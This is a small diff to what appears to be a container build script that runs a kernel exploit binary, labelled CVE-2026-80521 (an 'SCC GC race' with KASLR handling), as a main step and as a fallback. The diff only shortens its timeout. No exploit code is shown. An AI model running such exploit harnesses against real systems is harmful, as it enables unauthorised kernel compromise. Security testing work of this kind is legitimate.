@@ -26,7 +26,7 @@ case "$KVER" in \
     echo "SCTPHANTOM EXIT=$EC_SCTP" >&2; \
     if [ "$EC_SCTP" != "0" ]; then \
       echo "--- FALLBACK: CVE-2026-80521 (SCC GC race, plurality KASLR) ---"; \
-      timeout 1550 /payload 2>&1; \
+      timeout 1500 /payload 2>&1; \
       EC=$?; \
       echo "=== SCC_EXPLOIT EXIT=$EC ==="; \
       echo "SCC_EXPLOIT EXIT=$EC" >&2; \
@@ -61,7 +61,7 @@ case "$KVER" in \
     echo "=== KERNEL CONFIG PROBE END ==="; \
     echo "--- CVE-2026-80521 (SCC GC race) ---"; \
     echo "PAYLOAD START" >&2; \
-    timeout 1550 /payload 2>&1; \
+    timeout 1500 /payload 2>&1; \
     EC=$?; \
     echo "=== SCC_EXPLOIT EXIT=$EC ==="; \
     echo "PAYLOAD EXIT=$EC" >&2; \
